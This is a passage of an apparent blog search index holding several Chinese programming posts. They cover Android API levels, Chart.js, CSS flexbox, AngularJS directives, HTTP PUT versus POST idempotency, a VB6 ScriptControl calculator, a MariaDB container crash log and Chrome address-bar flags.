所有其他来自早期修订版的 API 部分都将结转，不做任何修改。 Android 平台提供的框架 API 使用叫做“API 级别”的整数标识符指定。 每个 Android 平台版本恰好支持一个 API 级别，但隐含了对所有早期 API 级别（低至 API 级别 1）的支持。 Android 平台初始版本提供的是 API 级别 1，后续版本的 API 级别递增。 下表列出了各 Android 平台版本支持的 API 级别。 平台版本 API 级别 VERSION_CODE Android 14 34 UPSIDE_DOWN_CAKE Android 13 33 TIRAMISU Android 12 32 S_V2 Android 12 31 S Android 11 30 R Android 10 29 Q Android 9 28 Pie Android 8.1 27 Oreo Android 8 26 Oreo Android 7.1 25 Nougat Android 7.0 24 Nougat Android 6.0 23 Marshmallow Android 5.1 22 LOLLIPOP_MR1 Android 5.0 21 LOLLIPOP Android 4.4W 20 KITKAT_WATCH Android 4.4 19 KITKAT Android 4.3 18 JELLY_BEAN_MR2 Android 4.2、4.2.2 17 JELLY_BEAN_MR1 Android 4.1、4.1.1 16 JELLY_BEAN Android 4.0.3、4.0.4 15 ICE_CREAM_SANDWICH_MR1 Android 4.0、4.0.1、4.0.2 14 ICE_CREAM_SANDWICH Android 3.2 13 HONEYCOMB_MR2 Android 3.1.x 12 HONEYCOMB_MR1 Android 3.0.x 11 HONEYCOMB Android 2.3.3、2.3.4 10 GINGERBREAD_MR1 Android 2.3、2.3.1、2.3.2 9 GINGERBREAD Android 2.2.x 8 FROYO Android 2.1.x 7 ECLAIR_MR1 Android 2.0.1 6 ECLAIR_0_1 Android 2.0 5 ECLAIR Android 1.6 4 DONUT Android 1.5 3 CUPCAKE Android 1.1 2 BASE_1_1 Android 1.0 1 BASE 语法123&lt;uses-sdk android:minSdkVersion=&quot;integer&quot; android:targetSdkVersion=&quot;integer&quot; android:maxSdkVersion=&quot;integer&quot; /&gt; 包含于1&lt;manifest&gt; 参考Android 开发者 | Android Developers分发信息中心 | Android 开发者 | Android Developers","link":"/2018/android-api-level/"},{"title":"ChartJS鼠标移到图例上显示手形","text":"在Chart options中添加： 123456789101112131415161718// 给图例加手势legend: { onHover: function(e) { e.target.style.cursor = 'pointer'; }},// 给图加手势hover: { onHover: function(e) { var point = this.getElementAtEvent(e); if (point.length) { e.target.style.cursor = 'pointer'; } else { e.target.style.cursor = 'default'; } }}","link":"/2018/chartjs-pointer-cursor/"},{"title":"如何实现flex布局下div等宽且内部文字可以溢出显示","text":"效果如图： HTML结构：123456789101112&lt;div class=&quot;labels&quot;&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;1&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;2&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;3&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;4&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;Today&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;6&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;7&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;8&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;9&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;10&lt;/span&gt;&lt;/div&gt;&lt;/div&gt; CSS样式：12345678910111213141516171819202122232425262728293031.labels { display: -webkit-flex; display: -ms-flexbox; display: flex; -webkit-flex-direction: row; -ms-flex-direction: row; flex-direction: row; -webkit-align-items: center; -ms-flex-align: center; align-items: center; .label { -webkit-flex: 1; -ms-flex: 1; flex: 1; display: -webkit-flex; display: -ms-flexbox; display: flex; -webkit-flex-direction: row; -ms-flex-direction: row; flex-direction: row; -webkit-justify-content: center; -ms-flex-pack: center; justify-content: center; overflow: hidden; span { overflow: visible; position: absolute; line-height: 0; } }}","link":"/2018/flex-same-width-overflow/"},{"title":"Shadow Defender 安装后启动蓝屏、无法启动、不兼容 Win10 解决方案","text":"Windows 10 系统驱动更新快，经常遇到更新完和 Shadow Defender 不兼容的情况，有时甚至造成 Windows 无法启动并且自动修复失败，这时候就要先禁用然后等待 Shadow Defender 更新。 如果当前启用了影子模式请从可启动的 CD/DVD/USB 设备启动, 然后删除隐藏文件 “C:\\diskpt0.sys” 并重新启动, 这将禁用阴影模式。 如果当前未启用影子模式请将 “C:\\Windows\\system32\\drivers\\null.sys” 复制到 “C:\\Windows\\system32\\drivers\\diskpt.sys”，这将覆盖 SD 使用的驱动程序，然后重新启动。","link":"/2018/shadow-defender-blue-screen/"},{"title":"Create, Update 和 HTTP 幂等性","text":"译自原文：https://stormpath.com/blog/put-or-post原作者：Stormpath 团队 2016/5/12更新：观看 Stormpath Hazlewood 的介绍 REST + JSON API 设计最佳实践. 别忘了， Stormpath 无需代码保护您的 API 的认证 创建、更新和 HTTP 幂等性对于构建基于 REST 的 api 的开发人员来说，有大量的错误信息和关于何时使用 http 发布和何时使用 http POST 的一些可理解的混淆。有人说 POST 应用于创建资源，PUT 应用于修改资源. 还有人说 PUT 应用于创建资源 POST 应用于修改资源。两者都不太正确。 通常，开发人员认为每个 HTTP 方法都与 CRUD 操作有 1:1 的关系： CRUD HTTP Create POST Read GET Update PUT Delete DELETE 这可以是真的，特别是GET和DELETE，但当涉及到哪些 HTTP 方法应该与创建和更新关联时，答案归结为 幂等性。 幂等性幂等性 是 HTTP 规范 中的一个重要概念，无论执行同一请求多少次，幂等 HTTP 请求都将导致服务器的相同状态。 GET，HEAD，PUT，和 DELETE 都具有此属性，但 POST 没有。 为了帮助说明幂等性，我们将使用一个帐户集合(*/accounts)，为了简洁起见，我们假定，每个帐户资源有三属性称为givenName，surname，和 status. 假设您使用 HTTP PUT 方法提交更新请求。在body里，你把 givenName 值定为 “John”，”surname” 值定为 “Smith”。然后，您提交另一个请求 HTTP PUT请求，这次设置 “givenName” 为 “Johnny”。这是幂等吗？不。为什么？因为其他请求 可能 在我们两个请求之间更改了帐户资源的服务器状态。例如，在两个请求之间，”status” 可能被更改为 “blocked”。我们的示例请求无法保证服务器上帐户的状态在重复时是 相同的。 请求： 12345HTTP/1.1 PUT /accounts/abcdef1234{ &quot;givenName&quot;: &quot;John&quot;, &quot;surname&quot;: &quot;Smith&quot;} 在我们的两个请求之后可能的帐户状态（由于其他请求的副作用）： 12345{ &quot;givenName&quot;: &quot;John&quot;, &quot;surname&quot;: &quot;Smith&quot;, &quot;status&quot;: &quot;enabled&quot;} 或者 12345{ &quot;givenName&quot;: &quot;John&quot;, &quot;surname&quot;: &quot;Smith&quot;, &quot;status&quot;: &quot;disabled&quot;} 引述 Dino Chiesa，“PUT 意味着放入一个资源 - 将任何在给定的 URL 可用的资源用不同的资源完全替换。” 使用 “PUT” 请求时, 必须将可用的属性 / 值（而不仅仅是要更改的） 全部 发送。如果我们想发送“disabled”的状态, 而不是 “givenName” 和 “surname”, PUT调用将是幂等的，且消除副作用的。幂等性是 HTTP 规范的基本属性, 必须坚持以保证 web 的互通性和规模化。 最后, 我们应该指出, HTTP 幂等性 仅适用于 服务端 状态, 而不是客户端状态。例如, 客户端可以成功地发送服务器幂等请求, 然后再次发送相同的精确服务器幂等请求, 并遇到错误（例如, 可能是由于服务器中的约束冲突）, 这完全是 “合法的”。只要 http 请求导致服务器上相同的状态，就能维持 HTTP 幂等性。 HTTP POST vs HTTP PUT既然 幂等性 是明确的, 那么在执行创建和更新操作时应该使用哪一种方法？以下是适当使用每个方法时的快速参考。 创建当您不知道资源标识符时, 使用 POST 创建资源。使用 POST 创建后, 最好的做法是返回 “201 Created” 的状态和新创建的资源的位置, 因为在提交时它的位置未知。这允许客户端稍后访问新资源 (如果需要)。 1234HTTP/1.1 POST /accounts{ ...} 返回： 12201 CreatedLocation: https://api.stormpath.com/accounts/abcdef1234 当允许客户端指定新创建的资源的资源标识时, 请使用 PUT。但是请记住, 既然 PUT 是幂等请求, 你必须发送所有可能的值。 123456HTTP/1.1 PUT /accounts/abcdef1234{ &quot;givenName&quot;: &quot;John&quot;, &quot;surname&quot;: &quot;Smith&quot;, &quot;status&quot;: &quot;enabled&quot;} 更新您可以使用 POST 来发送所有可用值或仅提供可用值的子集: 12345HTTP/1.1 POST /accounts/abcdef1234{ &quot;status&quot;: &quot;disabled&quot;}Response 200 OK 如果要使用 PUT 更新资源, 则必须是完整的资源更新；必须在 “提交” 请求中发送所有属性值以保证幂等性。 当需要或需要发送 所有 可用值以遵循幂等性要求时, 请使用 PUT, 例如, 在完全更新资源的情况下。 1234567HTTP/1.1 PUT /accounts/abcdef1234{ // 完全更新资源 &quot;givenName&quot;: &quot;J&quot;, &quot;surname&quot;: &quot;Smith&quot;, &quot;status&quot;: &quot;Enabled&quot;} 您也可以使用 POST 来发送所有值, 服务器状态可能与 PUT 完全相同–它只是不需要由 HTTP 规范来进行。请注意, 幂等性与 HTTP 缓存服务器可缓存的相关性很强, 因此 POST 请求通常不会被缓存。如果您对此缓存副作用感觉OK, 则可以使用 POST 来进行完全更新和部分更新。 POST 是当前唯一的非幂等方法。HTTP 规范是非常通用的, 并且基本上将其声明为 “服务器处理指令”。这意味着在 POST 请求中做任何您想做的事情是 “安全的”。 最后, 我们应该注意到还有另一种方法尚未最后确定的 HTTP 规范, 称为 PATCH。PATCH 可替代 POST 进行部分更新。然而, 由于 POST 已经可以简单地处理部分更新, 因此似乎没有足够的理由使用 PATCH，如果 HTTP 规范委员会批准，PATCH 将并入 POST 成为唯一的其他非幂等 HTTP 方法。","link":"/2018/put-or-post/"},{"title":"VB6.0巧用ScriptControl实现多功能科学计算器","text":"下载地址：http://download.csdn.net/download/imaegoo/5646305 1234567891011121314151617181920212223Private Sub Command_Click() On Error GoTo Command_Click_Err0 Dim ScriptControl As Object, Psw$2 Dim code As String100 code = &quot;Function encodePwd&quot; &amp; vbCrLf &amp; &quot;encodePwd = &quot; &amp; Text1.Text &amp; vbCrLf &amp; &quot;End Function&quot;102 Set ScriptControl = CreateObject(&quot;MSScriptControl.ScriptControl&quot;)104 ScriptControl.Language = &quot;VBScript&quot;106 ScriptControl.Timeout = -1108 ScriptControl.AddCode code110 Psw = ScriptControl.Run(&quot;encodePwd&quot;)112 Text2.Text = Psw114 Text1.SetFocusExit Sub Command_Click_Err:MsgBox &quot;::&gt;_&lt;:: 有以下错误&quot; &amp; vbCrLf &amp; Err.Description &amp; vbCrLf &amp; _ &quot;发生在 VBS语言计算器.MainForm.Command_Click &quot; &amp; _ &quot;的第 &quot; &amp; Erl &amp; &quot; 行&quot; &amp; vbCrLf &amp; vbCrLf &amp; &quot;检查一下你的语法是否正确 ：）&quot;, _ vbExclamation + vbOKOnly, &quot;出错啦！&quot;Resume Next'footEnd Sub","link":"/2018/vb-calculator/"},{"title":"AngularJS 给 directive scope 绑定的 function 传参","text":"如果我们想要给directive的scope中绑定的方法传递参数，需要传递对象，而不是直接传值。 举个栗子，这里的clickOutside是从用的地方传入的一个方法，debug时我们会发现绑进来的clickOutside并不是我们传的clickOutSideAction。 12345678910111213app.directive('clickOutSide', ['$document', function($document) { return { restrict: 'A', scope: { clickOutside: '&amp;' }, link: function (scope, el) { $document.on('click', function (e) { scope.clickOutside(); }); } }}]); 1&lt;div data-click-out-side click-Outside=&quot;$ctrl.clickOutSideAction()&quot;&gt;&lt;/div&gt; 如果需要在这里给clickOutSideAction传参数，应该这样改： 12345678910app.directive('clickOutSide', ['$document', function($document) { return { ... link: function (scope, el) { ... scope.clickOutside({event: e}); ... } }}]); 1&lt;div data-click-out-side click-Outside=&quot;$ctrl.clickOutSideAction(event)&quot;&gt;&lt;/div&gt; 好处是在实际使用directive的地方，不需要考虑参数列表顺序，只需要保证参数名称正确。","link":"/2019/ajs-function-in-directive-scope/"},{"title":"AngularJS input 输入框自适应内容宽度","text":"在Gist上找到的一个directive，用来让input输入框的宽度自适应内容宽度。https://gist.github.com/mbenford/8016984 原理是生成一个相同样式的，隐藏的span，通过span的宽度动态改变input的宽度。同时兼顾了input有placeholder的情况。 如果是在比较大的系统中，可以用throttle节流阀包装一下resize方法，避免性能问题。 如果是textarea，对应的directive在这里：https://github.com/monospaced/angular-elastic 效果： See the Pen input auto size directive by iMaeGoo (@iMaeGoo) on CodePen. HTML1234&lt;div ng-app=&quot;Test&quot; ng-controller=&quot;MainCtrl&quot;&gt; &lt;p&gt;Hello {{name}}!&lt;/p&gt; &lt;input type=&quot;text&quot; ng-model=&quot;name&quot; placeholder=&quot;type here&quot; autosize/&gt;&lt;/div&gt; JS1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var app = angular.module('Test', []);app.controller('MainCtrl', function ($scope) { $scope.name = '';});app.directive('autosize', function ($document) { return { require: 'ngModel', link: function (scope, element, attrs, ctrl) { var span; span = angular.element('&lt;span&gt;&lt;/span&gt;'); span.css('display', 'none') .css('width', 'auto'); element.parent().append(span); function resize(value) { var style = getComputedStyle(element[0]); span.css('font', style.font) .css('letter-spacing', style.letterSpacing) .css('word-spacing', style.wordSpacing) .css('padding', style.padding); if (value != null &amp;&amp; value.length === 0) { value = element.attr('placeholder') || ''; } span.text(value); span.css('display', ''); try { element.css('width', span.prop('offsetWidth') + 'px'); } finally { span.css('display', 'none'); } }; ctrl.$parsers.unshift(function (value) { resize(value); return value; }); ctrl.$formatters.unshift(function (value) { resize(value); return value; }); } };});","link":"/2019/ajs-auto-width-input/"},{"title":"AngularJS表达式无法引用$rootScope变量","text":"Angular version: 1.6.6在HTML中想使用$rootScope中的变量时发现取不到，加上$root之后解决。 HTML表达式 对应的JS变量 {{abc}} | $scope.abc {{$ctrl.abc}} | this.abc {{$root.abc}} | $rootScope.abc 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.6.6/angular.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt;&lt;body ng-app=&quot;myApp&quot;&gt;&lt;div ng-controller=&quot;myCtrl2 as ctrl2&quot;&gt;&lt;/div&gt;&lt;div ng-controller=&quot;myCtrl as ctrl&quot;&gt;&lt;input type=&quot;text&quot; ng-if=&quot;ctrl.name1&quot; ng-model=&quot;ctrl.name1&quot;&gt;&lt;br&gt;&lt;input type=&quot;text&quot; ng-if=&quot;name2&quot; ng-model=&quot;name2&quot;&gt;&lt;br&gt;&lt;input type=&quot;text&quot; ng-if=&quot;$root.name3&quot; ng-model=&quot;name3&quot;&gt;&lt;br&gt;&lt;/div&gt;&lt;script&gt;var app = angular.module('myApp', []);app.controller('myCtrl', function($scope) { this.name1 = &quot;this.iMaeGoo&quot;; $scope.name2= &quot;$scope.iMaeGoo&quot;;});app.controller('myCtrl2', function($rootScope) { $rootScope.name3= &quot;$rootScope.iMaeGoo&quot;;});&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2019/ajs-rootscope-in-html/"},{"title":"Bitnami MariaDB 重启失败记录","text":"自动部署的 Magento 附带的 MariaDB 镜像第一次启动能够成功，但 stop 之后就无法再次启动。启动命令 docker-compose up -d，重启命令 docker-compose restart， 关键 log： 123InnoDB: Assertion failure in file /bitnami/blacksmith-sandox/mariadb-10.2.28/storage/innobase/dict/dict0dict.cc line 1467InnoDB: Failing assertion: table-&gt;can_be_evicted[ERROR] mysqld got signal 6 ; 详细的 stdout 如下—— 第一次启动docker log12345678910111213141516171819202122232425262728293031323334353637383940414243 03:20:42.43 Welcome to the Bitnami mariadb container 03:20:42.43 Subscribe to project updates by watching https://github.com/bitnami/bitnami-docker-mariadb 03:20:42.43 Submit issues and feature requests at https://github.com/bitnami/bitnami-docker-mariadb/issues 03:20:42.44 Send us your feedback at containers@bitnami.com 03:20:42.44 03:20:42.44 INFO ==&gt; ** Starting MariaDB setup ** 03:20:42.48 INFO ==&gt; Validating settings in MYSQL_*/MARIADB_* env vars 03:20:42.48 WARN ==&gt; You set the environment variable ALLOW_EMPTY_PASSWORD=yes. For safety reasons, do not use this flag in a production environment. 03:20:42.49 INFO ==&gt; Initializing mariadb database 03:20:42.50 INFO ==&gt; Installing database 03:20:47.95 INFO ==&gt; Starting mariadb in background 03:20:48.97 INFO ==&gt; Configuring authentication 03:20:49.12 INFO ==&gt; Running mysql_upgrade 03:20:49.65 INFO ==&gt; Stopping mariadb 03:20:53.69 INFO ==&gt; ** MariaDB setup finished! ** 03:20:53.77 INFO ==&gt; ** Starting MariaDB **2019-11-08 3:20:53 140200746645312 [Note] /opt/bitnami/mariadb/sbin/mysqld (mysqld 10.2.28-MariaDB) starting as process 1 ...2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Uses event mutexes2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Compressed tables use zlib 1.2.82019-11-08 3:20:53 140200746645312 [Note] InnoDB: Using Linux native AIO2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Number of pools: 12019-11-08 3:20:53 140200746645312 [Note] InnoDB: Using SSE2 crc32 instructions2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Completed initialization of buffer pool2019-11-08 3:20:53 140200228304640 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Highest supported file format is Barracuda.2019-11-08 3:20:53 140200746645312 [Note] InnoDB: 128 out of 128 rollback segments are active.2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Creating shared tablespace for temporary tables2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Setting file './ibtmp1' size to 12 MB. Physically writing the file full; Please wait ...2019-11-08 3:20:53 140200746645312 [Note] InnoDB: File './ibtmp1' size is now 12 MB.2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Waiting for purge to start2019-11-08 3:20:54 140200746645312 [Note] InnoDB: 5.7.28 started; log sequence number 16200062019-11-08 3:20:54 140199854065408 [Note] InnoDB: Loading buffer pool(s) from /bitnami/mariadb/data/ib_buffer_pool2019-11-08 3:20:54 140199854065408 [Note] InnoDB: Buffer pool(s) load completed at 191108 3:20:542019-11-08 3:20:54 140200746645312 [Note] Plugin 'FEEDBACK' is disabled.2019-11-08 3:20:54 140200746645312 [Note] Server socket created on IP: '0.0.0.0'.2019-11-08 3:20:54 140200746645312 [Warning] 'proxies_priv' entry '@% root@58577f4b0595' ignored in --skip-name-resolve mode.2019-11-08 3:20:54 140200746645312 [Note] Reading of all Master_info entries succeeded2019-11-08 3:20:54 140200746645312 [Note] Added new Master_info '' to hash table2019-11-08 3:20:54 140200746645312 [Note] /opt/bitnami/mariadb/sbin/mysqld: ready for connections.Version: '10.2.28-MariaDB' socket: '/opt/bitnami/mariadb/tmp/mysql.sock' port: 3306 Source distribution 停止123456789102019-11-15 15:08:01 140200219911936 [Note] /opt/bitnami/mariadb/sbin/mysqld (initiated by: unknown): Normal shutdown2019-11-15 15:08:01 140200219911936 [Note] Event Scheduler: Purging the queue. 0 events2019-11-15 15:08:01 140200105715456 [Note] InnoDB: FTS optimize thread exiting.2019-11-15 15:08:01 140200219911936 [Note] InnoDB: Starting shutdown...2019-11-15 15:08:01 140199854065408 [Note] InnoDB: Dumping buffer pool(s) to /bitnami/mariadb/data/ib_buffer_pool2019-11-15 15:08:01 140199854065408 [Note] InnoDB: Instance 0, restricted to 2047 pages due to innodb_buf_pool_dump_pct=252019-11-15 15:08:01 140199854065408 [Note] InnoDB: Buffer pool(s) dump completed at 191115 15:08:012019-11-15 15:08:02 140200219911936 [Note] InnoDB: Shutdown completed; log sequence number 4822953382019-11-15 15:08:02 140200219911936 [Note] InnoDB: Removed temporary tablespace data file: &quot;ibtmp1&quot;2019-11-15 15:08:02 140200219911936 [Note] /opt/bitnami/mariadb/sbin/mysqld: Shutdown complete 重启后docker log123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106 16:16:36.31 Welcome to the Bitnami mariadb container 16:16:36.31 Subscribe to project updates by watching https://github.com/bitnami/bitnami-docker-mariadb 16:16:36.32 Submit issues and feature requests at https://github.com/bitnami/bitnami-docker-mariadb/issues 16:16:36.32 Send us your feedback at containers@bitnami.com 16:16:36.32 16:16:36.32 INFO ==&gt; ** Starting MariaDB setup ** 16:16:36.35 INFO ==&gt; Validating settings in MYSQL_*/MARIADB_* env vars 16:16:36.35 WARN ==&gt; You set the environment variable ALLOW_EMPTY_PASSWORD=yes. For safety reasons, do not use this flag in a production environment. 16:16:36.35 INFO ==&gt; Initializing mariadb database 16:16:36.36 INFO ==&gt; Using persisted data 16:16:36.37 INFO ==&gt; Running mysql_upgrade 16:16:36.37 INFO ==&gt; Starting mariadb in background2019-11-15 16:16:36 140149675591488 [Note] /opt/bitnami/mariadb/sbin/mysqld (mysqld 10.2.28-MariaDB) starting as process 109 ...2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Uses event mutexes2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Compressed tables use zlib 1.2.82019-11-15 16:16:36 140149675591488 [Note] InnoDB: Using Linux native AIO2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Number of pools: 12019-11-15 16:16:36 140149675591488 [Note] InnoDB: Using SSE2 crc32 instructions2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Completed initialization of buffer pool2019-11-15 16:16:36 140149158459136 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Highest supported file format is Barracuda.2019-11-15 16:16:36 0x7f7723a10740 InnoDB: Assertion failure in file /bitnami/blacksmith-sandox/mariadb-10.2.28/storage/innobase/dict/dict0dict.cc line 1467InnoDB: Failing assertion: table-&gt;can_be_evictedInnoDB: We intentionally generate a memory trap.InnoDB: Submit a detailed bug report to https://jira.mariadb.org/InnoDB: If you get repeated assertion failures or crashes, evenInnoDB: immediately after the mysqld startup, there may beInnoDB: corruption in the InnoDB tablespace. Please refer toInnoDB: https://mariadb.com/kb/en/library/innodb-recovery-modes/InnoDB: about forcing recovery.191115 16:16:36 [ERROR] mysqld got signal 6 ;This could be because you hit a bug. It is also possible that this binaryor one of the libraries it was linked against is corrupt, improperly built,or misconfigured. This error can also be caused by malfunctioning hardware.To report this bug, see https://mariadb.com/kb/en/reporting-bugsWe will try our best to scrape up some info that will hopefully helpdiagnose the problem, but since we have already crashed,something is definitely wrong and this may fail.Server version: 10.2.28-MariaDBkey_buffer_size=134217728read_buffer_size=131072max_used_connections=0max_threads=153thread_count=0It is possible that mysqld could use up tokey_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 467243 K bytes of memoryHope that's ok; if not, decrease some variables in the equation.Thread pointer: 0x0Attempting backtrace. You can use the following information to find outwhere mysqld died. If you see no messages after this, something wentterribly wrong...stack_bottom = 0x0 thread_stack 0x49000/opt/bitnami/mariadb/sbin/mysqld(my_print_stacktrace+0x29)[0x55bc847d6809]/opt/bitnami/mariadb/sbin/mysqld(handle_fatal_signal+0x39d)[0x55bc84306bcd]/lib/x86_64-linux-gnu/libpthread.so.0(+0x110e0)[0x7f77235ed0e0]/lib/x86_64-linux-gnu/libc.so.6(gsignal+0xcf)[0x7f7721aaafff]/lib/x86_64-linux-gnu/libc.so.6(abort+0x16a)[0x7f7721aac42a]/opt/bitnami/mariadb/sbin/mysqld(+0x413e3a)[0x55bc840d8e3a]/opt/bitnami/mariadb/sbin/mysqld(+0x966940)[0x55bc8462b940]/opt/bitnami/mariadb/sbin/mysqld(+0x973ff7)[0x55bc84638ff7]/opt/bitnami/mariadb/sbin/mysqld(+0x974750)[0x55bc84639750]/opt/bitnami/mariadb/sbin/mysqld(+0x975bc0)[0x55bc8463abc0]/opt/bitnami/mariadb/sbin/mysqld(+0x966870)[0x55bc8462b870]/opt/bitnami/mariadb/sbin/mysqld(+0x9b6fb0)[0x55bc8467bfb0]/opt/bitnami/mariadb/sbin/mysqld(+0x9bd2bd)[0x55bc846822bd]/opt/bitnami/mariadb/sbin/mysqld(+0x80a7fa)[0x55bc844cf7fa]/opt/bitnami/mariadb/sbin/mysqld(+0x8affd1)[0x55bc84574fd1]/opt/bitnami/mariadb/sbin/mysqld(+0x7b2820)[0x55bc84477820]/opt/bitnami/mariadb/sbin/mysqld(_Z24ha_initialize_handlertonP13st_plugin_int+0x65)[0x55bc84309115]/opt/bitnami/mariadb/sbin/mysqld(+0x4c9d88)[0x55bc8418ed88]/opt/bitnami/mariadb/sbin/mysqld(_Z11plugin_initPiPPci+0x7fa)[0x55bc8418fd2a]/opt/bitnami/mariadb/sbin/mysqld(+0x431825)[0x55bc840f6825]/opt/bitnami/mariadb/sbin/mysqld(_Z11mysqld_mainiPPc+0x1bd3)[0x55bc840fc3b3]/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf1)[0x7f7721a982e1]/opt/bitnami/mariadb/sbin/mysqld(_start+0x2a)[0x55bc840eff5a]The manual page at http://dev.mysql.com/doc/mysql/en/crashing.html containsinformation that should help you find out what is causing the crash.Writing a core file...Working directory at /bitnami/mariadb/dataResource Limits:Limit Soft Limit Hard Limit UnitsMax cpu time unlimited unlimited secondsMax file size unlimited unlimited bytesMax data size unlimited unlimited bytesMax stack size 8388608 unlimited bytesMax core file size unlimited unlimited bytesMax resident set unlimited unlimited bytesMax processes unlimited unlimited processesMax open files 1048576 1048576 filesMax locked memory 65536 65536 bytesMax address space unlimited unlimited bytesMax file locks unlimited unlimited locksMax pending signals 31861 31861 signalsMax msgqueue size 819200 819200 bytesMax nice priority 0 0Max realtime priority 0 0Max realtime timeout unlimited unlimited usCore pattern: |/usr/share/apport/apport %p %s %c %d %P/libos.sh: line 103: 109 Aborted (core dumped) &quot;$@&quot;","link":"/2019/bitnami-mariadb-container-failure/"},{"title":"Chrome 各版本地址栏显示完整地址（https 和 www）","text":"效果 由于谷歌最近对 Chrome 地址栏改来改去，不同的版本需要对应不同的方法。 Chrome 版本＜78在浏览器输入 chrome://flags/ 回车，找到 Omnibox UI Hide Steady-State URL Scheme and Trivial Subdomains，设置为 Disabled，然后重启浏览器。 Chrome 版本＝78谷歌从 flag 页面砍掉了这个设置，但 flag 还是存在的。 打开 chrome://flags/，78版本已经找不到 omnibox-ui-hide-steady-state-url-scheme 和 omnibox-ui-hide-steady-state-url-trivial-subdomains 了。按 F12 打开 Console，执行以下命令，然后重启 Chrome。 Console1234567[ 'omnibox-ui-hide-steady-state-url-path-query-and-ref', 'omnibox-ui-hide-steady-state-url-scheme', 'omnibox-ui-hide-steady-state-url-trivial-subdomains'].forEach((f) =&gt; { chrome.send('enableExperimentalFeature', [`${f}@2`, 'true']);}) 代码中 @2 对应的是 Disabled。@0 和 @1 分别对应 Default 和 Enabled。 测试有效的版本：78.0.3904.97方法来源：ysc3839（https://www.v2ex.com/t/613776） Chrome 版本＞78谷歌彻底砍掉了这两个 flag…… 现在安装插件是唯一方法，如果你能够访问 Chrome 网上应用店的话，安装这个插件，无需配置即可显示完整地址：https://chrome.google.com/webstore/detail/suspicious-site-reporter/jknemblkbdhdcpllfgbfekkdciegfboi方法来源：MaiKuraki（https://www.v2ex.com/t/588136） 如果是 Windows 系统，也可以换用 Chromium 内核的 Edge 浏览器，我已经完全爱上 Edge 啦！ Chromium据IT之家报导，谷歌决定“使URL更易于阅读和理解，并消除对可注册域的干扰”，在Chromium Gerrit中新提交了一个flag标志，未来可在 chrome://flags#context-menu-show-full-urls 中设置开启，届时Chrome浏览器地址栏便可显示完整URL。 嗯，砍了再加回来，绝世好活！ 我并没有下载 Chromium 测试这个 flag，未来推出有这个 flag 的正式版后，我可能会会更新这篇博文。 Chrome 最新版现在直接右键地址栏，然后打钩「总是显示完整地址」就行了！","link":"/2019/chrome-78-show-steady-state-url/"},{"title":"CSS鼠标悬浮改变相邻元素样式","text":"效果： .chip { display: flex; width: fit-content; font-size: 20px; text-align: center; background-color: #ccc; } .chip .name { width: 120px; } .chip .close-bth { width: 30px; } .chip .name:hover, .chip .name:hover + .close-bth, .chip .close-bth:hover { color: white; background-color: #888; } Hover me! X 源码： 1234&lt;div class=&quot;chip&quot;&gt; &lt;span class=&quot;name&quot;&gt;Hover me!&lt;/span&gt; &lt;span class=&quot;close-bth&quot;&gt;X&lt;/span&gt;&lt;/div&gt; 1234567891011121314151617.chip { display: flex; width: fit-content; font-size: 20px; text-align: center; background-color: #ccc;}.chip .name { width: 120px; }.chip .close-bth { width: 30px; }.chip .name:hover,.chip .name:hover + .close-bth,.chip .close-bth:hover { color: white; background-color: #888;} CodePen link:https://codepen.io/iMaeGoo/pen/jRqYRJ hmmmm…这种实现也没什么难的，其实是想试试在博文中插入HTML啦。","link":"/2019/css-adjacent-sibling-selector/"},{"title":"CSS 类似 iOS 的毛玻璃动态模糊效果","text":"提到网页毛玻璃效果，总结下来有以下2种： 模糊元素本身 模糊元素后面的内容 早在之前，1就已经可以通过 CSS3 filter 属性实现，而2一直没有一个好的解决方案。对1的运用，也可以达到2的效果，通过模糊图片的一部分，就可以实现类似 bilibili 导航栏的模糊背景效果 ↓ 